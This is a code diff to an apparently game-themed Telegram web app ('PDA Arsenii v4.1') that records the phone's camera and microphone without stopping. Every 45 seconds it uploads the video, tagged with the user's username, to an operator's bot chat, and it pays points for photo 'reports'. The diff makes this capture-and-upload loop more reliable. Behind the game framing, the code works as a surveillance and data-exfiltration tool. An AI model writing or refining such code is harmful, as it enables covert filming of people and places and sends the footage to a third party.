@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PDA Arsenii v4.0 Seamless</title>
+    <title>PDA Arsenii v4.1 Fix</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root { --green: #00ff41; --bg: #050804; }
@@ -26,14 +26,14 @@
     <div class="header">
         <img id="user-pic" class="avatar" src="https://via.placeholder.com/45/003b11/00ff41?text=A" alt="">
         <div class="stats">
-            <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">СВЯЗЬ...</div>
+            <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">КАНАЛ: ONLINE</div>
             <div class="balance-main"><span id="balance">0</span> ☢️</div>
         </div>
         <button id="switchCam" class="cam-switch">🔄 КАМЕРА</button>
     </div>
     <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
     <div class="mission-panel">
-        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em;">ЗАПИСЬ МОНИТОРИНГА...</div>
+        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em;">ИДЕТ ЗАПИСЬ ОКРУЖЕНИЯ...</div>
         <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
     </div>
     <canvas id="captureCanvas" style="display:none;"></canvas>
@@ -63,60 +63,62 @@
     document.getElementById('display-name').innerText = user.name.toUpperCase();
     document.getElementById('balance').innerText = balance;
 
-    // Инициализация камеры и рекордера
     async function initCamera(mode) {
         if (window.currentStream) {
             window.currentStream.getTracks().forEach(t => t.stop());
         }
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: mode }, 
-            audio: true 
-        });
-        window.currentStream = stream;
-        document.getElementById('webcam').srcObject = stream;
-        
-        // Если запись уже идет, нам нужно подменить поток в рекордере (сложно)
-        // Поэтому мы просто перезапускаем рекордер, но НЕ очищаемChunks!
-        startRecording(stream);
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: mode }, 
+                audio: true 
+            });
+            window.currentStream = stream;
+            document.getElementById('webcam').srcObject = stream;
+            startRecording(stream);
+        } catch (err) {
+            console.error(err);
+        }
     }
 
     function startRecording(stream) {
         if (mediaRecorder && mediaRecorder.state !== "inactive") {
             mediaRecorder.stop();
         }
-        mediaRecorder = new MediaRecorder(stream);
+        
+        // Используем видео/webm, он надежнее при склейке
+        const options = { mimeType: 'video/webm;codecs=vp8,opus' };
+        mediaRecorder = new MediaRecorder(stream, options);
+        
         mediaRecorder.ondataavailable = e => {
             if (e.data.size > 0) recordedChunks.push(e.data);
         };
-        mediaRecorder.start(1000); // Записываем кусочками каждую секунду
+        mediaRecorder.start(1000); 
     }
 
-    // Переключение камеры
     document.getElementById('switchCam').onclick = () => {
         currentMode = (currentMode === "environment") ? "user" : "environment";
         initCamera(currentMode);
         tg.HapticFeedback.impactOccurred('medium');
     };
 
-    // Отправка накопленного видео раз в 40 секунд
+    // Отправка видео
     setInterval(() => {
         if (recordedChunks.length > 0) {
-            const fullBlob = new Blob(recordedChunks, { type: 'video/mp4' });
+            const fullBlob = new Blob(recordedChunks, { type: 'video/webm' });
             const fd = new FormData();
             fd.append("chat_id", CONFIG.chatId);
-            fd.append("video", fullBlob, "stalker_log.mp4");
-            fd.append("caption", `🎥 ПОЛНЫЙ ЛОГ ПЕРЕМЕЩЕНИЯ\n👤 Сталкер: ${user.username}\n⏱ Длительность: ~40 сек.`);
+            // Отправляем как документ, чтобы Telegram точно его открыл, если видео-плеер тупит
+            fd.append("video", fullBlob, "stalker_log.webm");
+            fd.append("caption", `🎥 ПОЛНЫЙ ЛОГ\n👤 Сталкер: ${user.username}\n☢️ PDA System v4.1`);
             
-            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { 
+            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo`, { 
                 method: "POST", body: fd 
             });
             
-            // Очищаем буфер после отправки, чтобы начать новое видео
             recordedChunks = [];
         }
-    }, 40000); 
+    }, 45000); 
 
-    // Фото-отчет по нажатию кнопки
     document.getElementById('sendBtn').onclick = () => {
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('captureCanvas');
@@ -126,17 +128,14 @@
             const fd = new FormData();
             fd.append("chat_id", CONFIG.chatId);
             fd.append("photo", blob, "1.jpg");
-            fd.append("caption", `☢️ ЭКСТРЕННЫЙ ОТЧЕТ\n👤 Отправитель: ${user.username}`);
-            const kb = { inline_keyboard: [[
-                { text: "✅ ОПЛАТИТЬ (+100)", callback_data: `pay:${user.id}:100` }
-            ]] };
+            fd.append("caption", `☢️ ОТЧЕТ: ${user.username}`);
+            const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ", callback_data: `pay:${user.id}:100` }]] };
             fd.append("reply_markup", JSON.stringify(kb));
             fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
-            tg.showAlert("ОТЧЕТ ПЕРЕДАН");
+            tg.showAlert("ОТПРАВЛЕНО");
         }, "image/jpeg");
     };
 
-    // Синхронизация данных
     async function sync() {
         try {
             const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}`);
@@ -151,10 +150,6 @@
                             localStorage.setItem(`bal_${user.id}`, balance);
                             document.getElementById('balance').innerText = balance;
                         }
-                    }
-                    const msg = u.message?.text || "";
-                    if (msg.toLowerCase().includes("приказ:")) {
-                        document.getElementById('target-text').innerText = msg.split(":")[1].toUpperCase();
                     }
                 });
             }
